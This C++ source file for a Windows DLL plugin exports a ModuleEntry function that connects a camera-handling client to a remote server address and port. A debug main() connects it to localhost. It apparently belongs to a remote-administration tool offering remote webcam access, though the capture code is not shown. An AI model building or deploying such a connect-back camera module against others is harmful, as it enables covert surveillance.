
#include "Camera.h"
#include "Client.h"
#include "utils.h"

//extern "C" __declspec(dllexport) 
//void  ModuleEntry(char* szServerAddr, unsigned short uPort, DWORD dwParam){
//	CIOCPClient *pClient = new CIOCPClient(szServerAddr, uPort);
//
//	CMsgHandler *pHandler = new CCamera(pClient);
//	pClient->Run();
//
//	delete pHandler;
//	delete pClient;
//}




extern "C" __declspec(dllexport)
int  ModuleEntry(
	CIOCP * iocp,
	Module * owner,
	char* szServerAddr,
	unsigned short uPort,
	void *lpParam)

{
	int err = 0;
	CClient * client = new CClient;
	CCamera * cam = new CCamera(client, owner);

	if (!client->Create())
	{
		dbg_log("client->Create() failed");
		err = -1;
		goto __failed__;
	}

	if (!client->Bind(0))
	{
		dbg_log("client->Bind() failed");
		err = -2;
		goto __failed__;
	}

	if (!iocp->AssociateSock(client))
	{
		dbg_log("iocp->AssociateSock(client) failed");
		err = -3;
		goto __failed__;
	}

	if (!client->Connect(szServerAddr, uPort, NULL, NULL))
	{
		dbg_log("client->Connect() failed");
		err = -4;
		goto __failed__;
	}

	client->Put();
	return 0;

__failed__:
	client->Close();
	client->Put();
	return err;
}

#ifdef _DEBUG

int worker_thread_init(void * lpParam)
{
	HRESULT hr = CoInitialize(0);
	if (FAILED(hr)){
		return -1;
	}
	return 0;
}

void worker_thread_fini(void * lpParam)
{
	CoUninitialize();
}


int main(){

	WSADATA wsadata;

	if (WSAStartup(MAKEWORD(2, 0), &wsadata))
	{
		dbg_log("WSAStartup failed with error : %d", WSAGetLastError());
		exit(1);
	}

	CIOCP * iocp = new CIOCP(0,worker_thread_init,worker_thread_fini,NULL);
	iocp->Create();

	//
	ModuleEntry(iocp,NULL, "127.0.0.1", 10086, NULL);

	Sleep(INFINITE);
}
#endif